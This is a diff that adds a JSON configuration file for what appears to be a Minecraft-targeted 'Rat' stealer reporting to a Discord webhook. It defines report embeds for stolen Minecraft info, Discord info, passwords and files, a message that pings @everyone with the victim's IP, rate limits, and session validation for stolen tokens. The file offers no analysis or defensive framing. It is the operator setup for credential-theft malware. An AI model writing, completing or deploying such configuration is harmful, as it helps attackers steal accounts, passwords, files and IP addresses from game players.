@@ -1,0 +1,35 @@
+{
+  "webhook": "YOUR WEBHOOK URL HERE",
+  "webhook_name": "Webhook",
+  "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
+  "message": "@everyone %IP%",
+
+  "codeblock_type": "small",
+
+  "ip_ratelimit": 3,
+  "reset_ratelimit_after": 10,
+
+  "mc_embed_color": "FF031A",
+  "mc_embed_title": "Minecraft Info",
+  "mc_embed_footer_text": "Rat",
+  "mc_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+
+
+  "discord_embed_color": "0353FF",
+  "discord_embed_title": "Discord Info",
+  "discord_embed_footer_text": "Rat",
+  "discord_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+
+
+  "password_embed_color": "FFFF00",
+  "password_embed_title": "Passwords",
+  "password_embed_footer_text": "Rat",
+  "password_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+
+  "file_embed_color": "00FF00",
+  "file_embed_title": "Files",
+  "file_embed_footer_text": "Rat",
+  "file_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+
+  "validate_session": true
+}
